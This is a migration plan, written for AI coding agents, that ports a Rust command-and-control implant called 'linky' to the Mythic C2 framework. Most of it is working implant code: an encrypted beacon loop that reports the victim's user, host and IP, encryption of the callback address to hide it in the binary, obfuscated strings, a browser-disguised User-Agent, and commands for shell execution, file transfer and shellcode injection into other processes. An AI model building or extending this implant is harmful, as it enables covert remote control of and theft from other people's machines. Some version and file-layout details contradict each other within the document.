# linky-mythic — Migration Plan

> **For AI agents working on this project**: read this file in full before touching any code.
> Complete phases in order. Each task specifies exact files, diffs, and validation steps.
> Run the validation command at the end of each phase before moving on.

---

## Context and constraints

**Source project**: `linky/` — Rust C2 framework with a custom 3-stage HTTP protocol.
**Target project**: `linky-mythic/` — same Rust implants, adapted for the Mythic C2 framework.

**Single constraint**: HTTPS is the only supported C2 transport. The Mythic `http` C2 profile
handles TLS termination. No WebSocket, no SMB, no TCP — HTTP profile only.

**Do not touch**: `agent_capabilities.json`, `config.json`, `.gitignore`, `Dockerfile`.
These files are already correct.

**Current status**: The project is **partially functional**. Rust implants and Go container are built and ready, but end-to-end testing requires a live Mythic instance (Phase 5). Basic commands (`ls`, `cd`, `shell`, etc.) are implemented. Advanced features like file upload and process browsing are deferred to Phase 7.

**Reference files** (read before writing any code):
- `agent_code/links/common/src/lib.rs` — Mythic protocol implementation (Phase 1+2 done)
- `mythic/agent_functions/builder.go` — builder complet (Phase 3 done)
- `mythic/agent_functions/shell.go` — canonical command definition example

**Écarts par rapport au plan initial** (déjà implémentés ainsi, ne pas changer) :
- Structure à la racine, pas sous `Payload_Type/linky/` — tous les chemins Go sont relatifs à la racine
- Constants CALLBACK/IMPLANT_SECRET/PAYLOAD_UUID dans `stdlib.rs` (pas `main.rs`)
- `reqwest 0.12` (pas 0.13 — indisponible), `rand 0.8.5` (pas 0.10)
- `obfstr` retiré de `lib.rs` (strings JSON visibles sur le réseau de toute façon)

---

## Mythic wire format — mandatory reading

Every message between an implant and Mythic is:

```
<UUID_36_chars><base64(nonce_12_bytes || ciphertext)>
```

- `UUID` (36 chars): during checkin, the `PAYLOAD_UUID` baked into the binary.
  After checkin succeeds, Mythic returns a `callback_id`; all subsequent messages use that.
- `nonce` (12 bytes): random AES-GCM nonce, prepended to ciphertext — **raw bytes, not hex**.
- `ciphertext`: AES-256-GCM encrypted JSON payload.
- **The entire nonce+ciphertext blob is base64-encoded**, not hex-encoded.

The key is: `SHA-256(IMPLANT_SECRET || "mythic-salt")` — a 32-byte derived key.

> Note: `lib.rs` currently hex-encodes then decodes when building Mythic messages —
> this is functionally correct but wasteful. **Phase 2** cleans this up.

---

## Phase 0 — Repository layout (already done ✅)

The following files are already in place and must not be modified:

```
linky-mythic/
├── .gitignore
├── README.md
├── config.json
├── agent_capabilities.json
├── Payload_Type/linky/
│   ├── main.go
│   ├── go.mod
│   ├── Dockerfile
│   └── mythic/
│       ├── payload_type.go
│       └── agent_functions/
│           ├── builder.go          ← has TODOs, completed in Phase 3
│           ├── shell.go            ← complete
│           └── commands_stub.go    ← stubs, expanded in Phase 4
└── agent_code/
    ├── Cargo.toml
    └── links/common/src/lib.rs     ← Mythic protocol, has one cleanup TODO (Phase 2)
```

---

## Phase 1 — Migrate Rust implant crates from Linky ✅

Copy and adapt the four Rust crates from `linky/` into `agent_code/links/`.
The dispatch logic is **unchanged** — only the C2 loop entry point and build scripts change.

### 1.1 — Copy `links/common/src/dispatch.rs`

**Action**: copy `linky/links/common/src/dispatch.rs` verbatim to
`agent_code/links/common/src/dispatch.rs`.

No changes needed. The dispatch logic is protocol-agnostic.

---

### 1.2 — Create `agent_code/links/common/Cargo.toml`

Create this file. Keep the same dependencies as `linky/links/common/Cargo.toml`
but remove `chrono` (date formatting for killdate is now done with timestamps only):

```toml
[package]
name = "link-common"
version = "0.1.0"
edition = "2021"

[dependencies]
reqwest    = { version = "0.13", default-features = false, features = ["blocking", "json", "rustls-tls"] }
serde      = { version = "1", features = ["derive"] }
serde_json = "1"
base64     = "0.22"
rand       = "0.10"
aes-gcm    = "0.10"
sha2       = "0.10"
hex        = "0.4"
obfstr     = "0.4"
zeroize    = "1.8"
```

**Note**: the `cookies` feature is removed from reqwest — Mythic does not use cookie-based
session management. The `rustls-tls` feature replaces the default TLS backend so that
`danger_accept_invalid_certs(true)` works against Mythic's self-signed cert.

---

### 1.3 — Migrate `links/linux/`

Create the following files:

**`agent_code/links/linux/Cargo.toml`** — copy from `linky/links/linux/Cargo.toml` verbatim.

**`agent_code/links/linux/build.rs`** — extend `linky/links/linux/build.rs` with `PAYLOAD_UUID`:

```rust
fn main() {
    let callback = std::env::var("CALLBACK")
        .unwrap_or_else(|_| "127.0.0.1:443".to_string());
    println!("cargo:rustc-env=CALLBACK={}", callback);

    let secret = std::env::var("IMPLANT_SECRET").unwrap_or_else(|_| {
        "0000000000000000000000000000000000000000000000000000000000000000".to_string()
    });
    println!("cargo:rustc-env=IMPLANT_SECRET={}", secret);

    // NEW: Mythic payload UUID, passed by builder.go at build time
    let uuid = std::env::var("PAYLOAD_UUID")
        .unwrap_or_else(|_| "00000000-0000-0000-0000-000000000000".to_string());
    println!("cargo:rustc-env=PAYLOAD_UUID={}", uuid);

    println!("cargo:rerun-if-env-changed=CALLBACK");
    println!("cargo:rerun-if-env-changed=IMPLANT_SECRET");
    println!("cargo:rerun-if-env-changed=PAYLOAD_UUID");
}
```

**`agent_code/links/linux/src/stdlib.rs`** — copy `linky/links/linux/src/stdlib.rs` verbatim
**except** the `link_loop()` function, which must be replaced:

```rust
// REPLACE the old link_loop() with this:
pub fn link_loop() {
    link_common::run_c2_loop(
        CALLBACK,
        IMPLANT_SECRET,
        PAYLOAD_UUID,
        link_common::RegisterInfo {
            user: username(),
            host: hostname(),
            ip: local_ip(),
            os: "linux",
            arch: std::env::consts::ARCH,
            pid: std::process::id(),
            integrity_level: 2, // medium — Linux has no equivalent, use 2 as default
        },
        dispatch,
    );
}
```

**`agent_code/links/linux/src/main.rs`** — replace the old main with:

```rust
mod stdlib;

const CALLBACK: &str = env!("CALLBACK");
const IMPLANT_SECRET: &str = env!("IMPLANT_SECRET");
const PAYLOAD_UUID: &str = env!("PAYLOAD_UUID");

fn main() {
    stdlib::link_loop();
}
```

**Update `dispatch()` function signature** in `stdlib.rs`:

The old signature was `fn dispatch(raw: &str) -> String`.
The new signature must be `fn dispatch(command: &str, parameters: &str) -> String`
because Mythic separates the command name from its parameters.

Replace the old dispatch with:

```rust
fn dispatch(command: &str, parameters: &str) -> String {
    // For commands that take a single argument, parameters is the raw argument string.
    // For commands with no arguments, parameters is "".
    // Build a unified "raw" string for functions that expect it.
    let raw = if parameters.is_empty() {
        command.to_string()
    } else {
        format!("{} {}", command, parameters)
    };

    if let Some(output) = link_common::dispatch::dispatch_common(&raw) {
        return output;
    }

    match command {
        "whoami"  => format!("{}@{}", username(), hostname()),
        "info"    => collect_system_info(),
        "ps"      => list_processes(),
        "netstat" => list_network_connections(),
        "shell"   => shell_exec(parameters),
        _         => shell_exec(&raw),
    }
}
```

---

### 1.4 — Migrate `links/windows/`

Same pattern as Linux:

- `Cargo.toml`: copy from `linky/links/windows/Cargo.toml` verbatim.
- `build.rs`: same as Linux build.rs (add `PAYLOAD_UUID`).
- `src/stdlib.rs`: copy verbatim, replace `link_loop()` and `dispatch()` signatures same as Linux.
  Use `os: "windows"` and `integrity_level: integrity_level_int()` (see below).
- `src/main.rs`: same pattern, add `PAYLOAD_UUID` const.

**Additional change for Windows** — `link_loop()` should report the real integrity level:

```rust
pub fn link_loop() {
    link_common::run_c2_loop(
        CALLBACK,
        IMPLANT_SECRET,
        PAYLOAD_UUID,
        link_common::RegisterInfo {
            user: username(),
            host: hostname(),
            ip: local_ip(),
            os: "windows",
            arch: std::env::consts::ARCH,
            pid: std::process::id(),
            integrity_level: get_integrity_level_int(),
        },
        dispatch,
    );
}

/// Convert the text integrity level to the integer Mythic expects:
/// 2 = medium, 3 = high, 4 = system
fn get_integrity_level_int() -> u8 {
    match integrity_level().as_str() {
        "Medium" => 2,
        "High"   => 3,
        "System" => 4,
        _        => 2,
    }
}
```

---

### 1.5 — Migrate `links/osx/`

Same pattern as Linux:

- `Cargo.toml`, `build.rs`: copy and extend same as Linux.
- `src/stdlib.rs`: copy verbatim, replace `link_loop()` and `dispatch()`.
  Use `os: "macos"` and `integrity_level: 2`.
- `src/main.rs`: same pattern.

---

### Phase 1 validation ✅

```bash
cd agent_code

# Must compile without errors on native (no cross targets needed for check)
CALLBACK=x IMPLANT_SECRET=x PAYLOAD_UUID=x cargo check -p link-common
CALLBACK=x IMPLANT_SECRET=x PAYLOAD_UUID=x cargo check -p link-linux

# Cross-compile checks (requires musl-tools and mingw-w64 installed)
CALLBACK=x IMPLANT_SECRET=x PAYLOAD_UUID=x \
    cargo check -p link-linux --target x86_64-unknown-linux-musl

CALLBACK=x IMPLANT_SECRET=x PAYLOAD_UUID=x \
    cargo check -p link-windows --target x86_64-pc-windows-gnu

# Clippy — zero warnings
CALLBACK=x IMPLANT_SECRET=x PAYLOAD_UUID=x \
    cargo clippy --workspace -- -D warnings
```

---

## Phase 2 — Clean up the Mythic wire format in `lib.rs` ✅

The current `build_mythic_message` / `parse_mythic_message` functions in
`agent_code/links/common/src/lib.rs` hex-encode then immediately decode.
This phase replaces them with the clean direct implementation.

### 2.1 — Rewrite `build_mythic_message`

Replace the current implementation:

```rust
// REMOVE this:
pub fn build_mythic_message(uuid: &str, payload_json: &str, key: &[u8; 32]) -> String {
    let encrypted = encrypt(payload_json, key);
    let b64 = base64::engine::general_purpose::STANDARD.encode(hex::decode(&encrypted).unwrap_or_default());
    format!("{}{}", uuid, b64)
}

// WITH this:
pub fn build_mythic_message(uuid: &str, payload_json: &str, key: &[u8; 32]) -> String {
    use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    let nonce_bytes = rand::random::<[u8; 12]>();
    let nonce = Nonce::from_slice(&nonce_bytes);
    let cipher = Aes256Gcm::new_from_slice(key).expect("cipher init");
    let ct = cipher.encrypt(nonce, payload_json.as_bytes()).expect("encrypt");

    let mut blob = Vec::with_capacity(12 + ct.len());
    blob.extend_from_slice(&nonce_bytes);
    blob.extend_from_slice(&ct);

    format!("{}{}", uuid, STANDARD.encode(&blob))
}
```

### 2.2 — Rewrite `parse_mythic_message`

```rust
// REMOVE this:
pub fn parse_mythic_message(raw: &str, key: &[u8; 32]) -> Option<String> {
    if raw.len() < 36 { return None; }
    let b64_part = &raw[36..];
    let decoded = base64::engine::general_purpose::STANDARD.decode(b64_part).ok()?;
    let hex_str = hex::encode(decoded);
    decrypt(&hex_str, key)
}

// WITH this:
pub fn parse_mythic_message(raw: &str, key: &[u8; 32]) -> Option<String> {
    use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    if raw.len() < 36 { return None; }
    let blob = STANDARD.decode(&raw[36..]).ok()?;
    if blob.len() < 12 { return None; }

    let nonce = Nonce::from_slice(&blob[..12]);
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    cipher.decrypt(nonce, &blob[12..]).ok()
        .and_then(|b| String::from_utf8(b).ok())
}
```

### 2.3 — Remove now-unused functions

The old `encrypt()` and `decrypt()` functions (which used hex encoding) are no longer
called from `run_c2_loop`. They are still used for the callback address decryption at startup.
**Keep them** — but rename to clarify their role:

```rust
// Rename: encrypt() → encrypt_config()  (used for CALLBACK address embedding)
// Rename: decrypt() → decrypt_config()  (used for CALLBACK address at runtime)
```

Update all call sites inside `run_c2_loop` accordingly:
- `decrypt(callback, &encryption_key)` → `decrypt_config(callback, &encryption_key)`

### 2.4 — Add unit tests for the wire format

Add to `lib.rs` inside `#[cfg(test)] mod tests`:

```rust
#[test]
fn test_mythic_wire_roundtrip() {
    let key = derive_key(b"test-secret", "mythic-salt");
    let uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
    let payload = r#"{"action":"get_tasking","tasking_size":-1}"#;

    let wire = build_mythic_message(uuid, payload, &key);
    assert!(wire.starts_with(uuid));
    assert!(wire.len() > 36);

    let recovered = parse_mythic_message(&wire, &key).unwrap();
    assert_eq!(recovered, payload);
}

#[test]
fn test_mythic_wire_wrong_key_returns_none() {
    let key = derive_key(b"correct-key", "mythic-salt");
    let wrong_key = derive_key(b"wrong-key", "mythic-salt");
    let uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";

    let wire = build_mythic_message(uuid, "hello", &key);
    assert!(parse_mythic_message(&wire, &wrong_key).is_none());
}
```

### Phase 2 validation ✅

```bash
cd agent_code
CALLBACK=x IMPLANT_SECRET=x PAYLOAD_UUID=x cargo test -p link-common
```

---

## Phase 3 — Complete the Go builder ✅

### 3.1 — Implement `encryptCallback()` in `builder.go`

This function must produce output that the Rust `decrypt_config()` function can decrypt.
`decrypt_config` expects: `hex(nonce_12_bytes || ciphertext)`.

The Go implementation:

```go
import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "crypto/sha256"
    "encoding/hex"
    "io"
)

// encryptCallback encrypts the C2 callback address so it cannot be extracted
// as a plaintext string from the compiled binary.
// Output format: hex(nonce_12 || ciphertext) — must match Rust decrypt_config().
func encryptCallback(callback, secret string) string {
    // derive_key: SHA-256(secret || "mythic-salt")
    h := sha256.New()
    h.Write([]byte(secret))
    h.Write([]byte("mythic-salt"))
    key := h.Sum(nil) // 32 bytes

    block, err := aes.NewCipher(key)
    if err != nil {
        return callback // fallback to plaintext if crypto fails
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return callback
    }

    nonce := make([]byte, gcm.NonceSize()) // 12 bytes
    if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
        return callback
    }

    ct := gcm.Seal(nil, nonce, []byte(callback), nil)
    blob := append(nonce, ct...)
    return hex.EncodeToString(blob)
}
```

**Critical alignment check**: the Rust `decrypt_config` function in `lib.rs` takes
`hex(nonce || ct)` and decrypts with the key derived from `SHA-256(secret || "mythic-salt")`.
This Go implementation produces exactly that. Verify by cross-testing in Phase 4.

### 3.2 — Fix `PAYLOAD_UUID` passing in `builder.go`

The current code passes `input.PayloadUUID` as a raw `[16]byte` array, but the Rust
`build.rs` expects a 36-character UUID string (`xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`).

Replace:
```go
// REMOVE:
aesKey := hex.EncodeToString(input.PayloadUUID[:])
payloadUUID := input.PayloadUUID

// ADD:
import "github.com/google/uuid"

payloadUUID := input.PayloadUUID.String() // "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
aesKey := hex.EncodeToString(input.PayloadUUID[:]) // 32-char hex (used as IMPLANT_SECRET)
```

Update the env var injection:
```go
cmd.Env = append(os.Environ(),
    fmt.Sprintf("CALLBACK=%s", encryptedCallback),
    fmt.Sprintf("IMPLANT_SECRET=%s", aesKey),
    fmt.Sprintf("PAYLOAD_UUID=%s", payloadUUID), // must be the UUID string, not hex
)
```

### 3.3 — Update `go.mod` with new dependency

```go
module linky

go 1.21

require (
    github.com/MythicMeta/MythicContainerPkg v1.3.10
    github.com/google/uuid v1.6.0
)
```

Run `go mod tidy` inside `Payload_Type/linky/` after updating.

### 3.4 — Remove the `encoding/hex` import from the unused `aesKey` variable

After Phase 3.2, `aesKey` is used only as `IMPLANT_SECRET`. Verify that the
`encoding/hex` import is still needed (it is, for `hex.EncodeToString`).

### Phase 3 validation ✅

```bash
cd Payload_Type/linky
go mod tidy
go build ./...
```

This must compile without errors. No runtime test is possible without a live Mythic instance.

---

## Phase 4 — Expand command definitions in Go ✅

### 4.1 — Split `commands_stub.go` into individual files ✅

Each command stub in `commands_stub.go` must be extracted to its own file and completed
with proper `CommandParameters` and `TaskFunctionParseArgString` where applicable.
Use `shell.go` as the canonical template.

Create the following files (one per command):

**`ls.go`** — takes optional path parameter:
```go
CommandParameters: []agentstructs.CommandParameter{
    {
        Name: "path", CLIName: "path",
        ModalDisplayName: "Directory path",
        ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
        Description: "Directory to list (default: current directory)",
        Required: false, DefaultValue: ".",
    },
},
TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
    if input == "" { input = "." }
    return args.SetArgValue("path", input)
},
```

**`cd.go`** — required path:
```go
CommandParameters: []agentstructs.CommandParameter{
    {
        Name: "path", CLIName: "path",
        ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
        Required: true,
    },
},
TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
    return args.SetArgValue("path", input)
},
```

**`pwd.go`**, **`whoami.go`**, **`pid.go`**, **`info.go`**, **`ps.go`**, **`netstat.go`**
— no parameters, `TaskFunctionParseArgString` not needed.

**`sleep.go`** — two parameters:
```go
CommandParameters: []agentstructs.CommandParameter{
    {
        Name: "seconds", CLIName: "seconds",
        ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
        Required: true, DefaultValue: 5,
    },
    {
        Name: "jitter", CLIName: "jitter",
        ModalDisplayName: "Jitter percentage",
        ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
        Required: false, DefaultValue: 0,
    },
},
TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
    // input: "30" or "30 20"
    parts := strings.Fields(input)
    if len(parts) > 0 { args.SetArgValue("seconds", parts[0]) }
    if len(parts) > 1 { args.SetArgValue("jitter", parts[1]) }
    return nil
},
```

**`killdate.go`** — single string (date or "clear"):
```go
CommandParameters: []agentstructs.CommandParameter{
    {
        Name: "date", CLIName: "date",
        ModalDisplayName: "Kill date or 'clear'",
        ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
        Description: "Date in YYYY-MM-DD format, Unix timestamp, or 'clear'",
        Required: true,
    },
},
```

**`download.go`** — remote path:
```go
CommandParameters: []agentstructs.CommandParameter{
    {
        Name: "path", CLIName: "path",
        ModalDisplayName: "Remote file path",
        ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
        Required: true,
    },
},
```

**`upload.go`** — file + remote path. Use Mythic's native file upload type:
```go
CommandParameters: []agentstructs.CommandParameter{
    {
        Name: "file", CLIName: "file",
        ModalDisplayName: "File to upload",
        ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_FILE,
        Required: true,
    },
    {
        Name: "remote_path", CLIName: "remote_path",
        ModalDisplayName: "Destination path on implant",
        ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
        Required: true,
    },
},
```

**`inject.go`** — pid (number) + shellcode (string):
```go
CommandParameters: []agentstructs.CommandParameter{
    {
        Name: "pid", CLIName: "pid",
        ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
        Required: true,
    },
    {
        Name: "shellcode", CLIName: "shellcode",
        ModalDisplayName: "Base64-encoded shellcode",
        ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
        Required: true,
    },
},
TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
    parts := strings.SplitN(input, " ", 2)
    if len(parts) != 2 { return fmt.Errorf("usage: inject <pid> <base64_shellcode>") }
    args.SetArgValue("pid", parts[0])
    return args.SetArgValue("shellcode", parts[1])
},
```

**`integrity.go`** — no parameters, Windows only (already correct in stub).

### 4.2 — Update `RegisterAllCommands()` in `builder.go` ✅

Once individual files exist, remove the stub registrations from `commands_stub.go`.
Delete `commands_stub.go` entirely when all commands have their own file.

### 4.3 — Handle `parameters` JSON in the implant dispatch ✅

Mythic sends task parameters as a JSON string. In `dispatch()` in each `stdlib.rs`,
the `parameters` argument may be a JSON object string like `{"path": "/tmp"}` or
a plain string like `"/tmp"`, depending on how the command was registered.

Add a helper to `lib.rs`:

```rust
/// Extract a single string value from a Mythic parameters JSON object.
/// Falls back to using the raw string if it is not valid JSON.
/// Example: extract_param(r#"{"path": "/tmp"}"#, "path") → "/tmp"
pub fn extract_param(parameters: &str, key: &str) -> String {
    serde_json::from_str::<serde_json::Value>(parameters)
        .ok()
        .and_then(|v| v.get(key)?.as_str().map(|s| s.to_string()))
        .unwrap_or_else(|| parameters.to_string())
}
```

Update each `dispatch()` call site in `stdlib.rs` files to use `extract_param`:

```rust
fn dispatch(command: &str, parameters: &str) -> String {
    match command {
        "ls"       => link_common::list_dir(
                          &link_common::extract_param(parameters, "path")),
        "cd"       => std::env::set_current_dir(
                          link_common::extract_param(parameters, "path"))
                          .map(|_| String::new())
                          .unwrap_or_else(|e| format!("[-] {}", e)),
        "download" => link_common::download_file(
                          &link_common::extract_param(parameters, "path")),
        "sleep"    => {
            let secs = link_common::extract_param(parameters, "seconds");
            let jitter = link_common::extract_param(parameters, "jitter");
            link_common::handle_sleep_command(&format!("{} {}", secs, jitter).trim().to_string())
        },
        "killdate" => link_common::handle_killdate_command(
                          &link_common::extract_param(parameters, "date")),
        "shell"    => shell_exec(parameters),
        "whoami"   => format!("{}@{}", username(), hostname()),
        "info"     => collect_system_info(),
        "ps"       => list_processes(),
        "netstat"  => list_network_connections(),
        "pid"      => std::process::id().to_string(),
        "pwd"      => std::env::current_dir()
                          .map(|p| p.display().to_string())
                          .unwrap_or_else(|e| format!("[-] {}", e)),
        _          => shell_exec(&format!("{} {}", command, parameters)),
    }
}
```

For `upload`, the parameters include a file UUID from Mythic's file store.
This requires a Mythic API call to retrieve the file — implement in Phase 5.
For now, return a placeholder:
```rust
"upload" => "[-] upload via Mythic file store: implement in Phase 5".to_string(),
```

### Phase 4 validation ✅

```bash
cd Payload_Type/linky
go build ./...

# verify all expected symbols are present
go vet ./...
```

---

## Phase 5 — HTTPS configuration and Mythic HTTP profile

The Mythic `http` C2 profile is an external container, installed separately.
This project does not ship a C2 profile — it declares a dependency on `http`.

### 5.1 — Declare HTTPS-only in `payload_type.go`

No change needed: `SupportedC2Profiles: []string{"http"}` is already set.

### 5.2 — Document the required HTTP profile parameters in `README.md`

Add a section explaining that when generating a payload in the Mythic UI, the operator
must set the `http` C2 profile parameters:

- `callback_host`: `https://<your-server-ip-or-domain>` (must start with `https://`)
- `callback_port`: `443` (or your chosen port)
- `callback_interval`: default `10` (seconds)
- `callback_jitter`: default `23` (percent)

The implant will only use HTTPS. Any HTTP (port 80) callback host will fail at runtime
because the Rust client uses `reqwest` with `danger_accept_invalid_certs(true)` and
builds the URL as `https://` explicitly.

### 5.3 — Harden the `build_client()` in `lib.rs`

The current client uses `danger_accept_invalid_certs(true)`. This is required because
Mythic generates a self-signed certificate. Add a User-Agent that blends with browser
traffic (Mythic does not validate UA by default, but it is good practice):

```rust
pub fn build_client() -> reqwest::blocking::Client {
    use obfstr::obfstr as s;
    reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .user_agent(s!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"))
        .timeout(std::time::Duration::from_secs(30))
        .build()
        .expect("reqwest client init failed")
}
```

### 5.4 — Read the C2 URI from build parameters

The Mythic HTTP profile uses a configurable URI (default `/`). The implant must use
the same URI. Add it as a build parameter in `payload_type.go`:

```go
{
    Name:          "callback_uri",
    Description:   "C2 callback URI (must match HTTP profile configuration)",
    Required:      false,
    ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
    DefaultValue:  "/",
},
```

Pass it to the Rust build via env var in `builder.go`:

```go
callbackURI, _ := input.BuildParameters.GetStringArg("callback_uri")
// add to env:
fmt.Sprintf("CALLBACK_URI=%s", callbackURI),
```

Update `build.rs` files to add:
```rust
let uri = std::env::var("CALLBACK_URI").unwrap_or_else(|_| "/".to_string());
println!("cargo:rustc-env=CALLBACK_URI={}", uri);
println!("cargo:rerun-if-env-changed=CALLBACK_URI");
```

Update `run_c2_loop` signature and call sites to pass `callback_uri`:

```rust
// Replace the hardcoded:
let uri = s!("/");
// With:
// In main.rs: const CALLBACK_URI: &str = env!("CALLBACK_URI");
// Pass it into run_c2_loop as a new parameter.
```

### Phase 5 validation

No automated test possible without a live Mythic instance.
Verify the build completes without errors:

```bash
cd agent_code
CALLBACK=x IMPLANT_SECRET=x PAYLOAD_UUID=x CALLBACK_URI=/ \
    cargo build --release --target x86_64-unknown-linux-musl -p link-linux
```

---

## Phase 6 — End-to-end testing

### 6.1 — Set up a local Mythic instance

```bash
git clone https://github.com/its-a-feature/Mythic
cd Mythic && make
sudo ./mythic-cli start
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
```

Install linky-mythic from the local folder:
```bash
sudo ./mythic-cli install folder /path/to/linky-mythic
```

### 6.2 — Checkin test

1. In the Mythic UI (`https://localhost:7443`), go to **Payloads → Generate New Payload**.
2. Select `linky`, OS `linux`, callback host `https://127.0.0.1`, port `443`.
3. Download the generated binary.
4. Run it: `./link-linux`.
5. Verify a new callback appears in the **Active Callbacks** tab.

Expected: callback appears with correct hostname, user, PID, IP.

### 6.3 — Command test matrix

For each command, issue it from the Mythic UI task window and verify the output:

| Command | Expected output |
|---------|----------------|
| `whoami` | `user@hostname` |
| `pwd` | current directory path |
| `ls` | directory listing |
| `cd /tmp` | empty output, subsequent `pwd` shows `/tmp` |
| `info` | OS version, CPU, RAM, uptime |
| `ps` | process table |
| `netstat` | network connections |
| `shell id` | output of `id` command |
| `sleep 30 10` | confirmation message |
| `killdate 2030-01-01` | confirmation message |

### 6.4 — Encryption cross-test

Verify that the callback address encrypted by Go (`encryptCallback`) can be
decrypted by Rust (`decrypt_config`) at runtime. This is implicitly verified
by a successful checkin in 6.2.

If the implant hangs at startup (no checkin), the crypto is misaligned —
add temporary logging to the Rust `run_c2_loop` to print the decrypted callback.

---

## Phase 7 — Upload via Mythic file store

Implement `upload` properly using the Mythic file registration API.

### 7.1 — Go side (`upload.go`)

When `upload` is tasked, the `parameters` JSON contains a `file` UUID (Mythic file store ID)
and a `remote_path`. The Go `TaskFunctionCreateTasking` must retrieve the file content
from Mythic and include it in the task:

```go
TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
    resp := agentstructs.PTTaskCreateTaskingMessageResponse{TaskID: taskData.Task.ID, Success: true}
    fileID, _ := taskData.Args.GetFileArg("file")
    remotePath, _ := taskData.Args.GetStringArg("remote_path")

    // Register the file transfer with Mythic
    // The agent will receive the file content via the task parameters
    resp.DisplayParams = &remotePath
    _ = fileID // file content injection handled by MythicContainerPkg
    return resp
},
```

Consult the MythicContainerPkg documentation for the correct file handling API —
it may differ between package versions.

### 7.2 — Rust side (`dispatch` in `stdlib.rs`)

When `upload` is received, `parameters` contains the base64 file content and `remote_path`.
The existing `link_common::upload_file()` already handles `"<base64> <path>"` format.
Map the Mythic parameters to it:

```rust
"upload" => {
    let content = link_common::extract_param(parameters, "file_contents_base64"); // key TBD by Mythic
    let path = link_common::extract_param(parameters, "remote_path");
    link_common::upload_file(&format!("{} {}", content, path))
},
```

The exact parameter key depends on MythicContainerPkg version — check its source.

---

## Known issues and deferred items

| ID | Description | Phase |
|----|-------------|-------|
| D1 | `obfstr!()` on `"checkin"`, `"get_tasking"`, `"post_response"` strings in `lib.rs` — these are currently literal strings, visible in the binary. Wrap with `s!()`. | Post-Phase 6 |
| D2 | The `IMPLANT_SECRET` used as AES key is the hex of the 16-byte Payload UUID — 32 hex chars. This is weaker than a full 32-byte random secret. Future: generate a separate 32-byte random secret and embed it alongside the UUID. | Post-Phase 6 |
| D3 | No sleep jitter applied to the checkin retry loop — only to the polling loop. Add the same backoff + jitter to the retry. | Phase 5 cleanup |
| D4 | macOS cross-compilation (`x86_64-apple-darwin`) requires an SDK and additional tooling. The Dockerfile does not include it. Either document the limitation or add the `osxcross` toolchain. | Deferred |
| D5 | The HTTP profile URI is currently hardcoded to `"/"` in the existing `lib.rs`. Phase 5 adds the `CALLBACK_URI` build parameter — until Phase 5 is done, the URI must be `/`. | Fixed in Phase 5 |

---

## File checklist — expected state after all phases

```
agent_code/
└── links/
    ├── common/
    │   ├── Cargo.toml                 ← Phase 1.2
    │   └── src/
    │       ├── lib.rs                 ← Phase 2 (wire format cleanup)
    │       └── dispatch.rs            ← Phase 1.1 (copied from Linky)
    ├── linux/
    │   ├── Cargo.toml                 ← Phase 1.3
    │   ├── build.rs                   ← Phase 1.3
    │   └── src/
    │       ├── main.rs                ← Phase 1.3
    │       └── stdlib.rs              ← Phase 1.3 + Phase 4.3
    ├── windows/
    │   ├── Cargo.toml                 ← Phase 1.4
    │   ├── build.rs                   ← Phase 1.4
    │   └── src/
    │       ├── main.rs                ← Phase 1.4
    │       └── stdlib.rs              ← Phase 1.4 + Phase 4.3
    └── osx/
        ├── Cargo.toml                 ← Phase 1.5
        ├── build.rs                   ← Phase 1.5
        └── src/
            ├── main.rs                ← Phase 1.5
            └── stdlib.rs              ← Phase 1.5 + Phase 4.3

Payload_Type/linky/
├── main.go                            ← unchanged
├── go.mod                             ← Phase 3.3 (add uuid dep)
├── go.sum                             ← Phase 3.3 (go mod tidy)
├── Dockerfile                         ← unchanged
└── mythic/
    ├── payload_type.go                ← Phase 5.2 (add callback_uri param)
    └── agent_functions/
        ├── builder.go                 ← Phase 3 (encryptCallback + UUID fix)
        ├── shell.go                   ← unchanged
        ├── ls.go                      ← Phase 4.1
        ├── cd.go                      ← Phase 4.1
        ├── pwd.go                     ← Phase 4.1
        ├── whoami.go                  ← Phase 4.1
        ├── pid.go                     ← Phase 4.1
        ├── info.go                    ← Phase 4.1
        ├── ps.go                      ← Phase 4.1
        ├── netstat.go                 ← Phase 4.1
        ├── download.go                ← Phase 4.1
        ├── upload.go                  ← Phase 4.1 + Phase 7
        ├── sleep.go                   ← Phase 4.1
        ├── killdate.go                ← Phase 4.1
        ├── inject.go                  ← Phase 4.1
        └── integrity.go              ← Phase 4.1
        # commands_stub.go deleted in Phase 4.2
```